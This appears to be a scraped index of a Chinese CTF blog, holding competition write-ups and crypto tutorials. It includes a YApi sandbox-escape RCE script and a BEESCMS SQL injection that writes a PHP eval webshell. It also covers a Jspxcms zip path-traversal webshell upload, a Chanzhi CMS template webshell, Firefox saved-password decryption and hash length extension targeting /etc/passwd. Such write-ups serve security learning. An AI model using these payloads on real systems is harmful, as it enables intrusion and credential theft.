123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103&quot;&quot;&quot;Implementation of QIM method from Data Hiding Codes, Moulin and Koetter, 2005&quot;&quot;&quot;from __future__ import print_functionimport sysimport osHOME = os.environ[&quot;HOME&quot;]import numpy as npclass QIM: def __init__(self, delta): self.delta = delta def embed(self, x, m): &quot;&quot;&quot; x is a vector of values to be quantized individually m is a binary vector of bits to be embeded returns: a quantized vector y &quot;&quot;&quot; x = x.astype(float) d = self.delta y = np.round(x/d) * d + (-1)**(m+1) * d/4. return y def detect(self, z): &quot;&quot;&quot; z is the received vector, potentially modified returns: a detected vector z_detected and a detected message m_detected &quot;&quot;&quot; shape = z.shape z = z.flatten() m_detected = np.zeros_like(z, dtype=float) z_detected = np.zeros_like(z, dtype=float) z0 = self.embed(z, 0) z1 = self.embed(z, 1) d0 = np.abs(z - z0) d1 = np.abs(z - z1) gen = zip(range(len(z_detected)), d0, d1) for i, dd0, dd1 in gen: if dd0 &lt; dd1: m_detected[i] = 0 z_detected[i] = z0[i] else: m_detected[i] = 1 z_detected[i] = z1[i] z_detected = z_detected.reshape(shape) m_detected = m_detected.reshape(shape) return z_detected, m_detected.astype(int) def random_msg(self, l): &quot;&quot;&quot; returns: a random binary sequence of length l &quot;&quot;&quot; return np.random.choice((0, 1), l)def test_qim(): &quot;&quot;&quot; tests the embed and detect methods of class QIM &quot;&quot;&quot; #l = 10000 # binary message length delta = 20 # quantization step qim = QIM(delta) #x = np.random.randint(0, 255, l).astype(float) # host sample #msg = qim.random_msg(l) #y = qim.embed(x, msg) from PIL import Image img = Image.open(&#x27;ezSteganography-flag.png&#x27;) y = np.array(img) z_detected, msg_detected = qim.detect(y) new_img = Image.fromarray(np.uint8(255*msg_detected)) new_img.save(&#x27;part2.png&#x27;) #print(x) #print(msg) print(y) print(z_detected) #print(msg) print(msg_detected) #assert np.allclose(msg, msg_detected) # compare the original and detected messages #assert np.allclose(y, z_detected) # compare the original and detected vectorsdef main(): test_qim()if __name__ == &quot;__main__&quot;: sys.exit(main()) 得到隐写png水印图片： ​ WEBezrce 你真的会 nodejs 吗？ Yapi远程命令执行漏洞。 注册并登录账号，添加项目，选择设置，设置全局mock脚本： 123456const sandbox = thisconst ObjectConstructor = this.constructorconst FunctionConstructor = ObjectConstructor.constructorconst myfun = FunctionConstructor(&#x27;return process&#x27;)const process = myfun()mockJson = process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString() 打开脚本，添加一个接口，访问Mock地址即可成功RCE。 ​ jspxcms http://sdejkwdfnewi3f2jr32d3edfewd.dasctf.node4.buuoj.cn:82/ 靶机每十分钟重置一次。 Jspxcms解压getshell漏洞。 参考信息登录后台/cmscp/index.do，admin/空 弱口令进入后台，在文件管理可上传文件。 虽然能上传任意文件，但在JspDispatcherFilter.java限制了对jsp文件的访问，但可上传并解压zip文件，因WebFileUploadsController.java里的unzip方法调用了下层方法却没有进行文件名检查，导致可以目录穿透。 将大马cmd.war打包上传并解压，默认放在\\webapps\\ROOT\\uploads\\1\\下，再修改文件名为../../../cmd.war即可将cmd.war置于webapps根目录下，可自动解析。 访问/cmd查看根目录flag。 ​ cybercms 赛博CMS，只为安全而生 Hint: 信息搜集是一个web手必备的技能 下载源码www.zip，在/admin/version.php中发现此为BEESCMS v4.0改的CMS。 找到后台登录页面存在Beescms_v4.0 SQL注入漏洞，不同在于过滤函数除了fl_value和fl_html，还多了个f1_vvv： 1234567891011121314151617function fl_value($str)&#123; if(empty($str))&#123;return;&#125; return preg_replace(&#x27;/select|insert | update | and | in | on | left | joins | delete |\\%|\\=|\\.\\.\\/|\\.\\/| union | from | where | group | into |load_file|outfile/i&#x27;,&#x27;&#x27;,$str);&#125;define(&#x27;INC_BEES&#x27;,&#x27;B&#x27;.&#x27;EE&#x27;.&#x27;SCMS&#x27;);function fl_html($str)&#123; return htmlspecialchars($str);&#125;function f1_vvv($str)&#123; if(empty($str))&#123;return;&#125; if(preg_match(&quot;/\\ /i&quot;, $str))&#123; exit(&#x27;Go away,bad hacker!!&#x27;); &#125; preg_replace(&#x27;/0x/i&#x27;,&#x27;&#x27;,$str); return $str;&#125; fl_value过滤关键字，可双写绕过； f1_html中htmlspecialchars只对双引号编码，可用单引号绕过； f1_vvv中过滤空格和0x，空格可注释绕过，0x双写绕过。 payload: user=-1&#39;/**/uni union on/**/selselectect/**/00xx3c3f70687020406576616c28245f504f53545b636d645d293b3f3e,2,3,4,5/**/int into o/**/outoutfilefile/**/&#39;/var/www/html/2.php&#39;%23&amp;password=ss&amp;code=&amp;submit=true&amp;submit.x=46&amp;submit.y=24 写入shell，蚁剑连接，根目录找到flag。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021赛","slug":"2021赛","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"GKCTF x DASCTF应急挑战杯","slug":"match-GKCTFxDASCTF应急挑战杯","date":"2021-06-26T09:31:36.000Z","updated":"2021-06-29T11:50:57.838Z","comments":true,"path":"2021/06/26/match-GKCTFxDASCTF应急挑战杯/","permalink":"https://lazzzaro.github.io/2021/06/26/match-GKCTFxDASCTF%E5%BA%94%E6%80%A5%E6%8C%91%E6%88%98%E6%9D%AF/","excerpt":"","text":"​ 指导单位: 中国移动通信联合会主办单位: 防灾科技学院信息工程学院杭州安恒信息技术股份有限公司本次命题: Ginkgo战队比赛时间: 2021年6月26日09:00-17:00报名时间: 2021年6月21日19:30-6月26日9:00报名地址: buuoj.cn/das Rank: 40 CryptoRandom flag格式为 GKCTF{} 12345678910111213import randomfrom hashlib import md5def get_mask(): file = open(&quot;random.txt&quot;,&quot;w&quot;) for i in range(104): file.write(str(random.getrandbits(32))+&quot;\\n&quot;) file.write(str(random.getrandbits(64))+&quot;\\n&quot;) file.write(str(random.getrandbits(96))+&quot;\\n&quot;) file.close()get_mask()flag = md5(str(random.getrandbits(32)).encode()).hexdigest()print(flag) Python中random模块采用梅森旋转算法（MT19937）生成伪随机序列中的元素，该PRNG采用32位的state和32位的输出，在获得足够连续输出的情况下，梅森旋转算法接下来的输出值是可以准确预测的。 根据 random.txt 中104组 random.getrandbits() 函数输出值，利用预测工具 Mersenne Twister Predictor 来求出下一个随机数： 12345678910111213141516171819202122import randomfrom mt19937predictor import MT19937Predictorfrom hashlib import md5predictor = MT19937Predictor()file = open(&quot;random.txt&quot;,&quot;r&quot;).readlines()c1 = []c2 = []c3 = []for k in range(0,len(file),3): c1 += [int(file[k].strip())] c2 += [int(file[k+1].strip())] c3 += [int(file[k+2].strip())]for k in range(104): predictor.setrandbits(c1[k], 32) predictor.setrandbits(c2[k], 64) predictor.setrandbits(c3[k], 96)print(md5(str(predictor.getrandbits(32)).encode()).hexdigest())#14c71fec812b754b2061a35a4f6d8421 ​ Misc签到 师傅们玩的开心~（flag由flag头包裹 用Wireshark打开流量包文件 tmpshell.pcapng，追踪TCP流，从第3个流开始有HTTP POST数据包，都为 /g1nkgo/tmpshell.php 的RCE结果。 看到第5个流有 cat /f14g 命令结果，下载下来16进制查看，从文件头 1f8b0800000000000003 知为gzip文件，解压，逆序+base64解码得： [回车] [回车] [回车] ffllaagg{{}}WWeellcc))[删除] [删除] 00mmee__GGkkCC44FF__mm11ssiiCCCCCCCCCCCC!! 两个相同字符一组还原得flag。 ​ 问卷调查 https://www.wjx.cn/vj/Y3msOw2.aspx 感谢各位师傅参与本次比赛。 填问卷。 ​ 你知道apng吗 （flag由flag头包裹 apng图片（动态png图片），用apngdis工具提取各帧，发现第2、18、26帧有二维码。 QR_Research能识别出第18帧为 -ad20，以及第26帧为 -0327-288a235370ea&#125;，第2帧变形二维码无法识别，用在线工具qrazybox照着手绘，得到结果 flag&#123;a3c7e4e5。 flag应为uuid形式，还少一段，按照2、18、26的间隔，应该在第10帧里，stegsolve查看第10帧，在Red 2通道看到二维码，识别结果 -9b9d。 拼接得flag。 ​ 银杏岛の奇妙冒险 链接: https://pan.baidu.com/s/1cONFRAgjmu2-de67IRthhQ 密码: 04m0 链接：https://share.weiyun.com/hdikz5gL 密码：yjyh3g 游戏题 1.游戏启动需要java1.8环境，无java环境会自动帮助安装java环境，如果你已经有java1.8环境，即可无视这条信息 2.启动 “点击启动.exe” 文件，打开游戏启动器，输入你的ID 3.java环境配置完毕后，最好分配游戏内存至少为2048M 4.进入游戏后，根据游戏内的任务索引完成任务，即可获取flag 5.进入游戏 一定 一定 一定要注意对话信息，否则无法顺利的完成任务 5.祝大家玩的愉快 Minecraft游戏，试玩了下不熟悉，尝试从资源文件入手。 Everything搜索 flag 关键字，发现 .minecraft\\saves\\Where is the flag 存档目录，接着在 customnpcs\\quests\\主线 目录中找到主线对应的json文件有关键字符串： 2.json 中：&quot;&#123;\\&quot;text\\&quot;:\\&quot; part 1\\\\nw3lc0me_\\\\n\\\\npart 2\\\\n291 -95 67\\&quot;&#125;&quot;， 3.json 中：&quot;&#123;\\&quot;text\\&quot;:\\&quot; part 2\\\\nt0_9kctf_\\\\n\\\\npart 3 \\\\n324 -190 79\\&quot;&#125;&quot;， 4.json 中：&quot;&#123;\\&quot;text\\&quot;:\\&quot; part 3\\\\n2021_\\\\n\\\\npart 4\\\\n362 -144 69\\&quot;&#125;&quot;， 5.json 中：&quot;&#123;\\&quot;text\\&quot;:\\&quot; Part 4\\\\nCheck_1n\\\\n恭喜你，\\\\n完成签到，\\\\n武运昌隆。\\&quot;&#125;&quot;， 前面是内容，后面是下一处的坐标。 拼接，加头得flag。 ​ FireFox Forensics 取证大佬说这是一份登录凭证文件 得到 logins.json 和 key4.db 两个文件，结合题目知是火狐浏览器存储密码信息的密钥文件对，直接利用Firepwd工具解析（将两个文件置于脚本同一目录下）： python firepwd.py 结果： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152globalSalt: b&#x27;1e26e84b2f01da28d865e7258f9003d16b9c43f2&#x27; SEQUENCE &#123; SEQUENCE &#123; OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2 SEQUENCE &#123; SEQUENCE &#123; OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2 SEQUENCE &#123; OCTETSTRING b&#x27;66a735e17767b37d83d464126b36d4269243f9e0c99405ccd68f442798f83129&#x27; INTEGER b&#x27;01&#x27; INTEGER b&#x27;20&#x27; SEQUENCE &#123; OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256 &#125; &#125; &#125; SEQUENCE &#123; OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC OCTETSTRING b&#x27;24eb241594de7ab37ec379d9ba06&#x27; &#125; &#125; &#125; OCTETSTRING b&#x27;946322a2b2978db6601e449e1bdf7c4d&#x27; &#125;clearText b&#x27;70617373776f72642d636865636b0202&#x27;password check? True SEQUENCE &#123; SEQUENCE &#123; OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2 SEQUENCE &#123; SEQUENCE &#123; OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2 SEQUENCE &#123; OCTETSTRING b&#x27;56722302469f529a29dc73f28d6af3ed0ee483cceff05772e96e2313336816fd&#x27; INTEGER b&#x27;01&#x27; INTEGER b&#x27;20&#x27; SEQUENCE &#123; OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256 &#125; &#125; &#125; SEQUENCE &#123; OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC OCTETSTRING b&#x27;ef6a4df3e5fd7608c97df9e22092&#x27; &#125; &#125; &#125; OCTETSTRING b&#x27;51b24cd6a2672c312255d7f2dddeb67336fd56973b4302bb2eacf2270c251d41&#x27; &#125;clearText b&#x27;673dec57458fb95bd50bdc9198541038970e5b3d518973a40808080808080808&#x27;decrypting login/password pairshttps://ctf.g1nkg0.com:b&#x27;admin&#x27;,b&#x27;GKCTF&#123;9cf21dda-34be-4f6c-a629-9c4647981ad7&#125;&#x27; ​ ReverseQQQQT QQQT？什么东西？ 链接: https://pan.baidu.com/s/1e0fdBFIZ52EX04PwdgmpRQ 密码: cfiq IDA打开，在字符串窗口跟进 56fkoP8KhwCf3v7CEz 找到关键函数 sub_4012F0()： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107int __thiscall sub_4012F0(_DWORD *this)&#123; int v1; // edi _BYTE *v2; // esi const char *v3; // edx _BYTE *v4; // esi int v5; // ecx int v6; // eax int v7; // ecx int v8; // edx int v9; // edi int v10; // esi _BYTE *v11; // ecx unsigned int v12; // ecx int v14; // [esp-8h] [ebp-A8h] char v16[4]; // [esp+10h] [ebp-90h] BYREF char v17[4]; // [esp+14h] [ebp-8Ch] BYREF _BYTE *v18; // [esp+18h] [ebp-88h] const char *v19; // [esp+1Ch] [ebp-84h] int v20; // [esp+20h] [ebp-80h] int v21; // [esp+24h] [ebp-7Ch] BYREF _BYTE *v22; // [esp+28h] [ebp-78h] BYREF char v23[60]; // [esp+2Ch] [ebp-74h] BYREF __int128 v24[2]; // [esp+68h] [ebp-38h] BYREF __int64 v25; // [esp+88h] [ebp-18h] int v26; // [esp+9Ch] [ebp-4h] MEMORY[0x5FF6](*(_DWORD *)(this[6] + 4), v16); v26 = 0; MEMORY[0x7C7C](v16, v17); LOBYTE(v26) = 1; v19 = (const char *)MEMORY[0x7C48](v17); v24[0] = 0i64; v24[1] = 0i64; v25 = 0i64; strcpy(v23, &quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;); v21 = 138 * strlen(v19) / 0x64; v14 = v21 + 1; v1 = 0; v22 = (_BYTE *)MEMORY[0x8114](v21 + 1); v2 = v22; sub_402C08(v22, 0, v14); v3 = v19; v20 = (int)(v19 + 1); if ( strlen(v19) ) &#123; v4 = &amp;v2[v21]; v18 = v4; while ( 1 ) &#123; v20 = ((char)*v4 &lt;&lt; 8) + v3[v1]; v5 = v20 / 58; *v4 = v20 % 58; if ( v5 ) &#123; do &#123; v6 = (char)*--v4; v7 = (v6 &lt;&lt; 8) + v5; v20 = v7 / 58; *v4 = v7 % 58; v5 = v20; &#125; while ( v20 ); v4 = v18; &#125; if ( ++v1 &gt;= strlen(v19) ) break; v3 = v19; &#125; v2 = v22; &#125; v8 = 0; if ( !*v2 ) &#123; do ++v8; while ( !v2[v8] ); &#125; v9 = v21; if ( v8 &lt;= v21 ) &#123; v10 = v2 - (_BYTE *)v24; do &#123; v11 = (char *)v24 + v8++; *v11 = v23[(char)v11[v10]]; &#125; while ( v8 &lt;= v9 ); &#125; if ( !MEMORY[0x7C1A](v24, &quot;56fkoP8KhwCf3v7CEz&quot;) ) &#123; if ( v19 ) v12 = strlen(v19); else v12 = -1; v22 = (_BYTE *)MEMORY[0x7CCC](v19, v12); LOBYTE(v26) = 2; v21 = MEMORY[0x7CCC](&quot;flag&quot;, 4); LOBYTE(v26) = 3; MEMORY[0x6124](this, &amp;v21, &amp;v22, 1024, 0); MEMORY[0x7C66](&amp;v21); MEMORY[0x7C66](&amp;v22); &#125; MEMORY[0x7C30](v17); return MEMORY[0x7C66]();&#125; 分析代码逻辑知将输入字符串base58编码后的结果与字符串 56fkoP8KhwCf3v7CEz 比对，直接base58解码 56fkoP8KhwCf3v7CEz 得到 12t4tww3r5e77。加头即flag。 ​ Webeasycms 真·ezcms hint: 后台密码5位弱口令 蝉知cms，搜索知该cms存在后台任意文件读取与后台Getshell漏洞。 访问 admin.php，根据提示用 admin/12345 登进后台，在设计-高级里面可以直接编辑php模板文件： 在源码里加上一句话却发现需要验证用户权限： 如果编辑模板，需要管理员在cms的 /system/tmp 目录下新建一个名字为 xgem.txt 的文件来验证是否有写入权限。 在设计-组件-素材库可以上传素材，并且可以跨目录上传文件。本地新建一个 xgem.txt 文件，上传后把名称的参数改为 ../../../../../system/tmp/xgem： 再回到设计-高级模板编辑界面，尝试在首页模板文件 /var/www/html/system/tmp/template/default/index/index.html.php 中首行添加 &lt;?php phpinfo();?&gt;，保存。 回到首页发现执行成功： 将代码改为一句话 &lt;?php @eval($_POST[ccc]);?&gt;，蚁剑连接，在根目录访问文件 /flag 得到flag。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021赛","slug":"2021赛","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"不经意传输","slug":"crypto-不经意传输","date":"2021-06-20T04:07:57.000Z","updated":"2023-10-25T16:56:12.270Z","comments":true,"path":"2021/06/20/crypto-不经意传输/","permalink":"https://lazzzaro.github.io/2021/06/20/crypto-%E4%B8%8D%E7%BB%8F%E6%84%8F%E4%BC%A0%E8%BE%93/","excerpt":"","text":"​ 不经意传输（Oblivious Transfer, OT）是一种可保护隐私的双方通信协议、接受者的隐私不被发送者所知道，使通信双方以一种选择模糊化的方式传送消息。抽象地讲，就是A给B发消息，A却不知道B收到的是啥，一般的思路就是A要多发一些消息然后让B去选择有需要的，如果是这样的话，同时还应该保证B不会多知道他本不应该知道的消息。不经意传输可以分为1选1、2选1、n选1、n选k多种不经意传输协议。 1选1A给B发送一条消息，B只有 $\\frac{1}{2}$ 的概率能够接受到真正的消息，且A不知道B是否真正接受了消息。 A取两个素数 $p,q$，计算 $n=pq$，将 $n$ 发送给B； B任取 $x,x \\in (0,n),\\gcd(x,n)=1$，计算 $a=x^2 \\bmod n$，将 $a$ 发送给A； A知道 $p,q$，可以计算 $a=x^2 \\bmod n$ 的四个根 $(x,n-x,y,n-y)$，从中随机挑选一个送给B； B若收到 $y$ 或 $n-y$，则可计算 $p,q$：$\\gcd(x+y,n)=p$ 或 $\\gcd(x+y,n)=q$； B若收到 $x$ 或 $n-x$，则B什么也得不到。 ​ 2选1A给B发送两条消息 $(m_0, m_1)$，B能够在不知道另外一条消息的内容的情况下得知其中一条消息的内容，且A不知道B选择的哪条消息。 RSA实现 A有两个秘密消息 $m_0,m_1$； A使用RSA算法，生成公钥 $(N,e)$ 对公开，私钥 $d$ 自己留着。公钥 $(N,e)$ 告知B； （每次通信的时候RSA都要重新生成一对公钥私钥） A产生两个随机数 $x_0,x_1$，并且将这两个随机数传输给B； B决定要获取的数字编号 $b=\\{0,1\\}$，以及产生一个随机数 $k$； B计算一个数字 $v=(x_b+k^e) \\bmod N$，并且将这个 $v$ 发送给A； A计算多个 $k_i$，其中一个 $k_i$ 将会等于 $k$： $k_0=(v-x_0)^d \\bmod N \\ k_1=(v-x_1)^d \\bmod N$ 由于此时 $v$ 并不是A产生的，所以此时的A并不知道哪一个 $k$ 是B需要的； A将生成的值与自己手上的信息进行相加，得到全新的信息： $m_0’=m_0+k_0 \\ m_1’=m_1+k_1$ 并将信息发送给B。因为此时每一个信息都增加了 $k_i$，所以B无法直接还原信息 $m$； B此时知道自己选择的信息编号 $b$，于是选出 $m_b$，计算出 $k_b$，并且用 $m_b=m_b’-k_b$ 得到此时的解密信息。 攻击 构造 $v$ 得 $m_0,m_1$ $v=\\cfrac{\\text{scale}^e \\cdot x_0-x_1}{\\text{scale}^e-1}$ 可使 $k_1=\\text{scale} \\cdot k_0$，因此 $\\text{scale} \\cdot m_0’-m_1’=m_0 \\cdot \\text{scale} -m_1$。 首先，如果恰巧随机数 $m_0$ 和 $m_1$ 都小于 $\\text{scale}$，那么直接可以从 $m_0 \\cdot \\text{scale} -m_1$ 将两者求出。 其次，如果 $\\text{scale}$ 取值不能取得太大，而导致两个 $m$ 总是比它大，那只能老老实实穷举可能的低字节，再向高字节搜索。 参考： Pwnhub - BabyOT Hackergame 2020 - 不经意传输 其他实现 A发送 $g^s$ 给B，B知道 $g$ 和 $g^s$ 也无法破译 $s$，因为DLP问题不存在高效解法； B基于 $i$ 生成 $L_i=\\begin{cases} g^k ,&amp; i=0 \\newline g^{s-k} ,&amp; i=1 \\end{cases}$； B发送 $L_i$ 给A，A知道 $g$ 和 $g_k$ 也无法破译 $k$，因为DLP问题不存在高效解法。 因此，A无法知道B发来的是 $g_k$ 还是 $g_{s-k}$，也就无法知道 $i$； A生成 $C_0,C_1$： $C_0=(g^{r_0},(L_i)^{r_0} \\oplus v_0)\\ C_1=(g^{r_1},(\\frac{g^s}{L_i})^{r_1} \\oplus v_1)$ A发送 $C_0,C_1$ 给B，B知道 $g,g^{r_0},g^{r_1}$ 也无法破译 $r_0,r_1$，因为DLP问题不存在高效解法。 B解密 $v_i$： (1) 对于 $i=0$ 的情形： B可以通过如下方式解密获得 $v_0$： $C_0[0]^k \\oplus C_0[1]=(g^{r_0})^k \\oplus (L_i)^{r_0} \\oplus v_0=(g^{r_0})^k \\oplus (g^k)^{r_0} \\oplus v_0=v_0$ B无法获得 $v_1$ 因为 $C_1[1]=(\\frac{g^s}{L_i})^{r_1} \\oplus v_1=g^{(s-k)r_1} \\oplus v_1$，而 B不知道 $s,r_1$。 (2) 对于 $i=1$ 的情形： B可以通过如下方式解密获得 $v_1$： $C_1[0]^k \\oplus C_1[1]=(g^{r_1})^k \\oplus (L_i)^{r_1} \\oplus v_1=(g^{r_1})^k \\oplus (g^k)^{r_1} \\oplus v_1=v_1$ B无法获得 $v_0$ 因为 $C_0[1]=(L_i)^{r_0} \\oplus v_0=g^{(s-k)r_0} \\oplus v_0$，而 B不知道 $s,r_0$。 因此，B只能解密 $v_i$ 而不能解密 $v_{1-i}$。","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"OT","slug":"OT","permalink":"https://lazzzaro.github.io/tags/OT/"}],"author":"Lazzaro"},{"title":"哈希长度扩展攻击","slug":"crypto-哈希长度扩展攻击","date":"2021-06-01T16:02:52.000Z","updated":"2022-06-01T16:25:46.363Z","comments":true,"path":"2021/06/02/crypto-哈希长度扩展攻击/","permalink":"https://lazzzaro.github.io/2021/06/02/crypto-%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/","excerpt":"","text":"​ 哈希长度扩展攻击原理 在密码学和计算机安全中，长度扩展攻击（Length extension attacks）是指针对某些允许包含额外信息的加密散列函数的攻击手段。 该攻击适用于在消息与密钥的长度已知的情形下，所有采取了 H(key||message) 此类构造的散列函数。MD5和SHA-1等基于Merkle–Damgård构造的算法均对此类攻击显示出脆弱性。 攻击的要点在于： 攻击者可以控制message 攻击者需要知道key的长度，如不知道可以考虑暴力破解 攻击已经知道了包含key的一个消息的hash值 hash算法使用了Merkle–Damgård construction进行数据的压缩（比如MD5、SHA-1等）并采取 H(key||message) 构造 攻击可以达到的效果在于，如果知道一个原消息哈希值 H(key||M1) 及其 key||M1 长度，对于任意的字符串M2，攻击者可以计算出 H(pad(key||M1) + M2) 的值，而不需要知道是 key 及 M1 是多少。 以区块为单位操作数据（MD5, SHA1, SHA256的区块长度是512 bits，大多数message的长度不会刚好可以被哈希函数的区块长度整除。这样一来，message就必须被填充(padding)至区块长度的整数倍）。 每个消息块都会和一个输入向量做一个运算，把这个计算结果当成下个消息块的输入向量 ，初始化向量是定义好的，在最后一块的时候，才会将其对应的链接变量转换为hash值。 由已知的MD5值逆向得到对应的链接变量，利用得到的链接变量对填充后的新加的消息进行哈希算法，最后得到hash值。 步骤 MD5操作流程： 用 md5 函数作为例子。 md5 算法在计算的时候会初始化四个寄存器 A、B、C、D，分别有自己的初始值： 1234word A: 01 23 45 67word B: 89 ab cd efword C: fe dc ba 98word D: 76 54 32 10 md5 算法是以 512bit 为一个块进行迭代计算的，第一个块计算完后，四个寄存器的值就会被更新，如果还存在下一个块，就会在现在四个寄存器里面的数值的基础上继续迭代计算，等全部的块计算完成后，四个寄存器中的十六进制连接起来，就是最终的 MD5 值。换句话说，也就是当第一个块计算完成后，此时四个寄存器中存储的就是第一个块的 MD5 值，接着在这个基础上继续迭代计算下一个块。 如果当前的数据长度不满足对 512bit 求余为 448bit 的时候，需要补至满足这个条件，填充的方法如下： 首先补一个 1（二进制位上的一个 1，不是十进制的 1） 接着在后面补 0（同样是二进制位上的 0），直到满足比特长度对 512 求余为 448 这个条件。 接着补 64bit 的长度，这个长度是在补 1 和 0 以前的长度，如果长度超出了 64bit，那么就取低 64bit。换句话说：补完的一个块可能是这个样子的： raw_data + &#39;\\x80&#39; + &#39;\\x00&#39;*n + &#39;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&#39; 第一个 raw_data 的部分就是原始的数据，第二个部分 \\x80 是一开始补的一个二进制位 1，接着补若干个 \\ x00，直到整个长度达到 56Byte，最后的 8Byte 就是 raw_data 的长度，如果 raw_data 的长度超过了 2^64bit，则取低 64bit。 MD5 算法中的补位的这部分，就是实现长度扩展攻击的关键。 通过长度扩展攻击，我们可以利用 md5 的一些 trick 绕过这个限制。这个问题实际上变成了：如何在不知道 salt/key/secret 的情况下，计算出一个文件名的合法 hash 值。 通过前面对 md5 算法的了解，我们知道，当一个块计算完成后，ABCD 四个寄存器中的值就是刚计算完的 hash 值，如果后面还有数据块，那么会在已有的 ABCD 四个寄存器中的值上进行更新。 那么如果我们将 ABCD 四个寄存器中的值设置为 test.pdf 对应的 hash 值，那么就相当于 MD5 的计算过程中，已经完成了对前一个块的计算，接着向下计算就可以了。 123456789101112131415161718192021222324#include &lt;stdio.h&gt;#include &lt;openssl/md5.h&gt;int main(int argc, const char *argv[])&#123; int i; unsigned char buffer[MD5_DIGEST_LENGTH]; MD5_CTX c; MD5_Init(&amp;c); MD5_Update(&amp;c, &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;, 64); c.A = 0x9b104365; c.B = 0xf78738b5; c.C = 0x42fe46bb; c.D = 0x4ae2264f; MD5_Update(&amp;c, &quot;/../../../../etc/passwd&quot;, 23); MD5_Final(buffer, &amp;c); for (i = 0; i &lt; 16; i++) &#123; printf(&quot;%02x&quot;, buffer[i]); &#125; printf(&quot;\\n&quot;); return 0;&#125; 里面的 64 个 A 无所谓是什么，只是为了让 MD5 进行一个块的计算，然后我们将四个寄存器中的值改掉，注意大小端。然后计算附加数据的 MD5。 工具 HashPump：https://github.com/bwall/HashPump 123456789101112131415$ hashpump -hHashPump [-h help] [-t test] [-s signature] [-d data] [-a additional] [-k keylength] HashPump generates strings to exploit signatures vulnerable to the Hash Length Extension Attack. -h --help Display this message. -t --test Run tests to verify each algorithm is operating properly. -s --signature The signature from known message. -d --data The data from the known message. -a --additional The information you would like to add to the known message. -k --keylength The length in bytes of the key being used to sign the original message with. Version 1.2.0 with CRC32, MD5, SHA1, SHA256 and SHA512 support. &lt;Developed by bwall(@botnet_hunter)&gt; $ hashpump -s &#x27;6d5f807e23db210bc254a28be2d6759a0f5f5d99&#x27; --data &#x27;count=10&amp;lat=37.351&amp;user_id=1&amp;long=-119.827&amp;waffle=eggo&#x27; -a &#x27;&amp;waffle=liege&#x27; -k 140e41270260895979317fff3898ab85668953aaa2count=10&amp;lat=37.351&amp;user_id=1&amp;long=-119.827&amp;waffle=eggo\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02(&amp;waffle=liege hash_extender：https://github.com/iagox86/hash_extender 12345let secret = &quot;secret&quot;let data = &quot;data&quot;let H = md5()let signature = hash(secret || data) = 6036708eba0d11f6ef52ad44e8b74d5blet append = &quot;append&quot; 12345$ ./hash_extender --data data --secret 6 --append append --signature 6036708eba0d11f6ef52ad44e8b74d5b --format md5Type: md5Secret length: 6New signature: 6ee582a1669ce442f3719c47430dadeeNew string: 64617461800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005000000000000000617070656e64 hexpand：https://github.com/amlweems/hexpand 1234567891011121314Usage: hexpand -t type -s signature -l length -m message hexpand --testOptions: -t --type the hash algorithm for expansion (md5, sha1, sha256, or sha512 -s --sig the result of the original hash function -l --length the length of the original message -m --message the message to be appended --test runs a set of test cases $ ./hexpand -t md5 -s cd9fb5c3a20e29b2b2846deaa845c426 -l 55 -m &quot;\\nP.S. Tell Eve our secret plan&quot;Append (hex): 80b8010000000000005c6e502e532e2054656c6c20457665206f75722073656372657420706c616e2eSignature: 69b0e397b5588c86aa9751b56f2c6943 参考 哈希长度扩展攻击","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"hash","slug":"hash","permalink":"https://lazzzaro.github.io/tags/hash/"}],"author":"Lazzaro"},{"title":"DozerCTF 2021","slug":"match-DozerCTF-2021","date":"2021-05-30T14:23:15.000Z","updated":"2021-05-30T16:54:45.628Z","comments":true,"path":"2021/05/30/match-DozerCTF-2021/","permalink":"https://lazzzaro.github.io/2021/05/30/match-DozerCTF-2021/","excerpt":"","text":"​ 比赛时间：2021年5月29日 9:00-2021年5月30日晚21:30比赛平台：http://1.14.160.21:8000/ Web几乎全是域渗透，Crypto几乎全是AES。 Rank: 12 Misc不会有人以为re那道才是签到吧 欢迎参加DozerCTF 2021 https://www.bilibili.com/video/BV1VK4y1G7HQ 视频中后段有闪过的flag，拼手速暂停大法。 ​ detective_novel 听说扫一扫就有flag flag.png 分离出 zip压缩包，在 novel 